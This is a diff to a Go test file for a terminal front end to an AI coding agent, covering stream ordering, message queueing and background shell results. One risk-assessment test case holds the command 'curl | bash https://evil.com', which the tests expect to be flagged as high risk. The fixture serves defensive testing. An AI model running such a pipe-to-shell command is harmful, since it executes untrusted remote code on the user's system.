@@ -22,6 +22,97 @@ func init() {
 	os.Setenv("DROVER_HISTORY_DIR", filepath.Join(os.TempDir(), "drover-test-history"))
 }
 
+func TestResizeAndCompactDoNotReorderStream(t *testing.T) {
+	ch := make(chan agent.Event, 4)
+	m := New(ch, "m", t.TempDir(), "u", "h")
+	initCmd := m.Init()
+	next, resizeCmd := m.Update(tea.WindowSizeMsg{Width: 100, Height: 40})
+	m = next.(*Model)
+	m.SetCompactFn(func() error { return nil })
+	compactCmd, ok := m.handleBuiltinSlash("/compact")
+	if !ok {
+		t.Fatal("expected /compact")
+	}
+	if n := countEventReaders(t, ch, initCmd, resizeCmd, compactCmd); n != 1 {
+		t.Fatalf("event readers = %d, want 1", n)
+	}
+
+	m.eventWaitArmed = false
+	var cmd tea.Cmd = m.armEventWait()
+	for _, part := range []string{"P", "ong", "! 🏓"} {
+		ch <- agent.TextDeltaEvent{Text: part}
+		msg := cmd()
+		next, cmd = m.Update(msg)
+		m = next.(*Model)
+	}
+	if got := m.streamBuf.String(); got != "Pong! 🏓" {
+		t.Fatalf("stream buf %q", got)
+	}
+}
+
+// countEventReaders runs cmds the way Bubble Tea does and counts how many
+// block on ch. A blink or compact command returns immediately and is not counted.
+func countEventReaders(t *testing.T, ch chan agent.Event, cmds ...tea.Cmd) int {
+	t.Helper()
+	var n int
+	var walk func(tea.Cmd)
+	walk = func(cmd tea.Cmd) {
+		if cmd == nil {
+			return
+		}
+		done := make(chan tea.Msg, 1)
+		go func() { done <- cmd() }()
+		select {
+		case msg := <-done:
+			if batch, ok := msg.(tea.BatchMsg); ok {
+				for _, c := range batch {
+					walk(c)
+				}
+			}
+			return
+		case <-time.After(100 * time.Millisecond):
+		}
+		select {
+		case ch <- agent.TextDeltaEvent{Text: "x"}:
+		case <-time.After(100 * time.Millisecond):
+			return
+		}
+		select {
+		case msg := <-done:
+			if _, ok := msg.(agentMsg); ok {
+				n++
+			}
+		case <-time.After(100 * time.Millisecond):
+			select {
+			case <-ch:
+			default:
+			}
+		}
+	}
+	for _, cmd := range cmds {
+		walk(cmd)
+	}
+	return n
+}
+
+func TestModel_CtrlGSendsDraftBeforeQueue(t *testing.T) {
+	ch := make(chan agent.Event, 1)
+	m := New(ch, "m", t.TempDir(), "u", "h")
+	m.agentBusy = true
+	cancelled := false
+	m.runCancel = func() { cancelled = true }
+	m.InputArea.Queue("already waiting")
+	m.InputArea.SetValue("do this now")
+	next, _ := m.Update(tea.KeyMsg{Type: tea.KeyCtrlG})
+	m2 := next.(*Model)
+	if !cancelled {
+		t.Fatal("expected the live turn to be cancelled")
+	}
+	if q := m2.InputArea.QueuedMessages(); len(q) != 2 || q[0] != "do this now" || q[1] != "already waiting" {
+		t.Fatalf("queue %#v", q)
+	}
+}
+
 func TestModel_WindowSizeSetsDimensions(t *testing.T) {
 	ch := make(chan agent.Event, 1)
 	m := New(ch, "m", "/w", "u", "h")
@@ -773,7 +864,7 @@ func TestModel_multiTurnTwoUserSubmissions(t *testing.T) {
 func TestModel_messageQueueingWhileBusy(t *testing.T) {
 	ch := make(chan agent.Event, 1)
 	m := New(ch, "m", "/w", "u", "h")
-	
+
 	var runs []string
 	m.runFunc = func(input string) tea.Cmd {
 		runs = append(runs, input)
@@ -793,7 +884,7 @@ func TestModel_messageQueueingWhileBusy(t *testing.T) {
 	m2.InputArea.SetValue("task 2")
 	next, _ = m2.Update(tea.KeyMsg{Type: tea.KeyEnter})
 	m3 := next.(*Model)
-	
+
 	if len(runs) != 1 {
 		t.Fatalf("second run happened too early: %v", runs)
 	}
@@ -801,10 +892,10 @@ func TestModel_messageQueueingWhileBusy(t *testing.T) {
 	if len(q) != 1 || q[0] != "task 2" {
 		t.Fatalf("expected queue to have 'task 2', got %v", q)
 	}
-	
+
 	next, _ = m3.Update(agentRunCompleteMsg{err: nil})
 	m4 := next.(*Model)
-	
+
 	if len(runs) != 2 || runs[1] != "task 2" {
 		t.Fatalf("expected runFunc to be called with 'task 2', got runs: %v", runs)
 	}
@@ -900,7 +991,7 @@ func TestModel_StressTest500Turns(t *testing.T) {
 		// 3. Simulate Agent finishing
 		currentModel, _ = currentModel.Update(agentMsg{event: agent.DoneEvent{}})
 		currentModel, _ = currentModel.Update(agentRunCompleteMsg{err: nil})
-		
+
 		// 4. Periodically call View to ensure no panics during layout rendering under heavy load
 		if i%50 == 0 {
 			_ = currentModel.(*Model).View()
@@ -1082,9 +1173,9 @@ func TestModel_assessPermissionRisk(t *testing.T) {
 			wantReasonContains: "destructive shell",
 		},
 		{
-			name:    "bash curl pipe bash in summary",
-			tool:    "bash",
-			summary: "curl | bash https://evil.com",
+			name:      "bash curl pipe bash in summary",
+			tool:      "bash",
+			summary:   "curl | bash https://evil.com",
 			wantLevel: "high",
 		},
 		{
@@ -1182,6 +1273,151 @@ func TestModel_GuardRiskFromGuardError(t *testing.T) {
 	}
 	if m.StatusBar == nil || m.StatusBar.RiskLevel != "high" {
 		t.Fatal("StatusBar not updated with high risk from guard error")
+	}
+}
+
+func TestBackgroundBash_QueuesBehindUserWhileBusy(t *testing.T) {
+	ch := make(chan agent.Event, 1)
+	m := New(ch, "m", t.TempDir(), "u", "h")
+	m.agentBusy = true
+	m.InputArea.Queue("user typed this")
+
+	next, cmd := m.Update(BackgroundBashMsg{Done: true, Running: 0, Output: "Background command b1 finished."})
+	m = next.(*Model)
+	if cmd != nil {
+		t.Fatal("busy turn should keep the result queued")
+	}
+	got := m.InputArea.QueuedMessages()
+	if len(got) != 1 || got[0] != "user typed this" {
+		t.Fatalf("user queue = %#v", got)
+	}
+	if len(m.pendingBash) != 1 || !strings.Contains(m.pendingBash[0], "b1") {
+		t.Fatalf("pending = %#v", m.pendingBash)
+	}
+	if m.StatusBar.BackgroundJobs != 0 {
+		t.Fatalf("jobs = %d", m.StatusBar.BackgroundJobs)
+	}
+}
+
+func TestBackgroundBash_SurvivesTurnError(t *testing.T) {
+	ch := make(chan agent.Event, 1)
+	m := New(ch, "m", t.TempDir(), "u", "h")
+	var got string
+	m.SetRunFunc(func(input string) tea.Cmd {
+		got = input
+		return nil
+	})
+	m.agentBusy = true
+	m.turnOpen = true
+	next, cmd := m.Update(BackgroundBashMsg{Done: true, Running: 0, Output: "finished b1"})
+	m = next.(*Model)
+	if cmd != nil || len(m.pendingBash) != 1 {
+		t.Fatalf("cmd=%v pending=%#v", cmd, m.pendingBash)
+	}
+	next, _ = m.Update(agentMsg{event: agent.ErrorEvent{Err: errPlain{"boom"}}})
+	m = next.(*Model)
+	if len(m.pendingBash) != 1 {
+		t.Fatal("error cleared the background result")
+	}
+	next, _ = m.Update(agentRunCompleteMsg{err: errPlain{"boom"}})
+	m = next.(*Model)
+	if got != "finished b1" {
+		t.Fatalf("submitted %q", got)
+	}
+}
+
+func TestAgentRunComplete_IgnoresOlderRun(t *testing.T) {
+	ch := make(chan agent.Event, 1)
+	m := New(ch, "m", t.TempDir(), "u", "h")
+	m.agentBusy = true
+	m.turnOpen = true
+	m.runGen = 2
+	m.pendingBash = []string{"finished b1"}
+	next, cmd := m.Update(agentRunCompleteMsg{gen: 1})
+	m = next.(*Model)
+	if cmd != nil || !m.agentBusy || !m.turnOpen || len(m.pendingBash) != 1 {
+		t.Fatalf("busy=%v open=%v pending=%#v cmd=%v", m.agentBusy, m.turnOpen, m.pendingBash, cmd)
+	}
+}
+
+func TestBackgroundBash_SubmitsWhenIdle(t *testing.T) {
+	ch := make(chan agent.Event, 1)
+	m := New(ch, "m", t.TempDir(), "u", "h")
+	var got string
+	m.SetRunFunc(func(input string) tea.Cmd {
+		got = input
+		return nil
+	})
+
+	next, cmd := m.Update(BackgroundBashMsg{Running: 1})
+	m = next.(*Model)
+	if cmd != nil || m.StatusBar.BackgroundJobs != 1 {
+		t.Fatalf("start notice cmd=%v jobs=%d", cmd, m.StatusBar.BackgroundJobs)
+	}
+
+	next, _ = m.Update(BackgroundBashMsg{Done: true, Running: 0, Output: "done-text"})
+	m = next.(*Model)
+	if got != "done-text" {
+		t.Fatalf("submitted %q", got)
+	}
+	if !m.agentBusy || m.StatusBar.BackgroundJobs != 0 {
+		t.Fatalf("busy=%v jobs=%d", m.agentBusy, m.StatusBar.BackgroundJobs)
+	}
+}
+
+func TestBackgroundBash_DoesNotResumePausedAgent(t *testing.T) {
+	ch := make(chan agent.Event, 1)
+	m := New(ch, "m", t.TempDir(), "u", "h")
+	var called bool
+	m.SetRunFunc(func(string) tea.Cmd {
+		called = true
+		return nil
+	})
+	m.StatusBar.Paused = true
+
+	next, cmd := m.Update(BackgroundBashMsg{Done: true, Running: 0, Output: "finished b1"})
+	m = next.(*Model)
+	if called || cmd != nil {
+		t.Fatal("paused agent resumed")
+	}
+	if !m.StatusBar.Paused {
+		t.Fatal("pause cleared")
+	}
+	turns := m.HistoryView.GetTurns()
+	if len(turns) == 0 || turns[len(turns)-1].Content != "finished b1" {
+		t.Fatalf("turns = %#v", turns)
+	}
+}
+
+func TestBackgroundBash_CancelDoesNotSubmitPending(t *testing.T) {
+	ch := make(chan agent.Event, 1)
+	m := New(ch, "m", t.TempDir(), "u", "h")
+	var called bool
+	m.SetRunFunc(func(string) tea.Cmd {
+		called = true
+		return nil
+	})
+	m.agentBusy = true
+	m.turnOpen = true
+	m.runGen = 1
+	m.pendingBash = []string{"finished b1"}
+
+	next, cmd := m.Update(agentRunCompleteMsg{err: context.Canceled, gen: 1})
+	m = next.(*Model)
+	if called || cmd != nil {
+		t.Fatal("cancel resumed from the background result")
+	}
+	if !m.StatusBar.Paused || len(m.pendingBash) != 0 {
+		t.Fatalf("paused=%v pending=%#v", m.StatusBar.Paused, m.pendingBash)
+	}
+	var saw bool
+	for _, turn := range m.HistoryView.GetTurns() {
+		if turn.Content == "finished b1" {
+			saw = true
+		}
+	}
+	if !saw {
+		t.Fatal("background result was not kept as a note")
 	}
 }
 
